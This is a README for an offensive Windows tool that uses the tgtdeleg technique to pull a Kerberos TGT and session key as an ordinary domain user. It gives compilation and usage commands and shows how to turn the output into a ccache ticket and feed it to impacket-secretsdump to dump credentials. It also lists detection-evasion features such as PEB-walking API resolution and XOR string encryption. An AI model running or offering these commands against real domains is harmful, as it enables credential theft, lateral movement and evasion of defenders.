# TGTDeleg

A standalone Kerberos TGT extraction tool using the tgtdeleg technique. Runs as a regular domain user without elevation.

## How It Works

The tool abuses SSPI to request a delegation TGT, then extracts the session key from the Kerberos ticket cache. The output can be processed by an external script to reconstruct a usable `.kirbi` or `.ccache` ticket.

## Compilation

```bash
x86_64-w64-mingw32-g++ -O2 -s -static tgtdeleg.cpp -o tgtdeleg.exe
```

## Usage

```bash
# Auto-detect target SPN (HOST/<local FQDN>)
tgtdeleg.exe

# Specify target SPN manually
tgtdeleg.exe -t HOST/dc.domain.local
```

## Output

```
[*] Target SPN: HOST/workstation.domain.local
[AP-REQ]
6082...

[Session Key]
A1B2C3...
```

## Post-Processing

Use the `extract_tgt.py` script to convert the output into a usable ticket:

```bash
python3 extract_tgt.py -req <AP_REQ_HEX> -key <SESSION_KEY_HEX> -out ticket.ccache
export KRB5CCNAME=ticket.ccache

# Now use with Impacket or other Kerberos tools
impacket-secretsdump domain/user@target -k -no-pass
```

## Detection Evasion

- Dynamic API resolution via PEB walking (no static imports of sensitive functions)
- Compile-time string encryption (XOR)
- No suspicious process creation or token manipulation
